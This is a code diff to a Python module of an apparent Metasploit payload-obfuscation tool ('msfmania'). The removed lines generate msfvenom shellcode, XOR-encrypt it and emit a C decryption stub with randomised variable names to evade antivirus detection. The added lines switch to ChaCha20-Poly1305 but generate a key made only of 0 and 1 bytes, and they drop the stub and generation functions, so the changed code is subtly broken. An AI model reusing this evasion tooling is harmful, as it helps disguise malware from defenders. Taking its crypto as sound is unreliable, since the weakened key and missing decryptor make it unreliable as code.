@@ -1,37 +1,32 @@
 from msfmania import core
 from subprocess import PIPE, run
 from os import urandom
-from random import randint
+from random import choice
 from binascii import hexlify
-
-
-def shellcode_generation(msfvenom):
-    shellcode = run(msfvenom, shell=False, stdout=PIPE).stdout.decode('utf-8')
-    shellcode = shellcode.replace("unsigned char buf[] =", "").replace('"', '').replace("\n", "").replace(" ", "").replace(";", "")
-    core.shellcode_generated()
-    encrypted_shellcode, key = shellcode_encryption(shellcode)
-    vshellcode, stub = decrypt_stub(encrypted_shellcode, key)
-    core.shellcode_encrypted()
-    return vshellcode, stub
+from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
 
 
 def shellcode_encryption(shellcode):
-    key = keygen(randint(192, 256))
-    encrypted_shellcode = xor(shellcode.encode('latin-1'), key)
-    encrypted_shellcode = readable(encrypted_shellcode)
-    key = readable(key)
-    return encrypted_shellcode, key
+    key = keygen_binary(32)  # 32 bytes key with only 0s and 1s
+    nonce = urandom(12)  # 12 bytes nonce for ChaCha20-Poly1305
+    
+    shellcode_bytes = shellcode
+    
+    # Encrypt with ChaCha20-Poly1305
+    cipher = ChaCha20Poly1305(key)
+    encrypted_shellcode = cipher.encrypt(nonce, shellcode_bytes, None)
+    
+    # Convert to readable format
+    encrypted_shellcode_readable = readable(encrypted_shellcode)
+    key_readable = readable(key)
+    nonce_readable = readable(nonce)
+    
+    return encrypted_shellcode_readable, key_readable, nonce_readable
 
 
-def xor(data, key):
-    while len(key) < len(data):
-        key = key * 2
-    data = data.decode('unicode-escape').encode('latin-1')
-    return bytes(x ^ y for x, y in zip(data, key[:len(data)]))
-
-
-def keygen(keylen):
-    return urandom(keylen)
+def keygen_binary(keylen):
+    """Generate a key of specified length using only 0s and 1s"""
+    return bytes([choice([0, 1]) for _ in range(keylen)])
 
 
 def readable(data):
@@ -41,22 +36,3 @@ def readable(data):
     for i in range(0, len(data) - 1, 2):
         pdata += "\\x" + data[i] + data[i + 1]
     return pdata
-
-
-def decrypt_stub(encrypted_shellcode, key):
-    eshellcode = core.varname_creator()
-    dkey = core.varname_creator()
-    vshellcode = core.varname_creator()
-    j = core.varname_creator()
-    i = core.varname_creator()
-    stub = "char " + eshellcode + "[]=" + '"' + encrypted_shellcode + '";\n'
-    stub += "char " + dkey + "[]=" + '"' + key + '";\n'
-    stub += "char " + vshellcode + "[sizeof " + eshellcode + "];\n"
-    stub += "int " + j + "=0;\n"
-    stub += "for (int " + i + "=0; " + i + "< sizeof " + eshellcode + "; " + i + "++){\n"
-    stub += "if (" + j + "== sizeof " + dkey + "-1) " + j + "=0;\n"
-    stub += vshellcode + "[" + i + "]=" + eshellcode + "[" + i + "] ^ " + dkey + "[" + j + "];\n"
-    stub += j + "++;}\n"
-
-    return vshellcode, stub
-
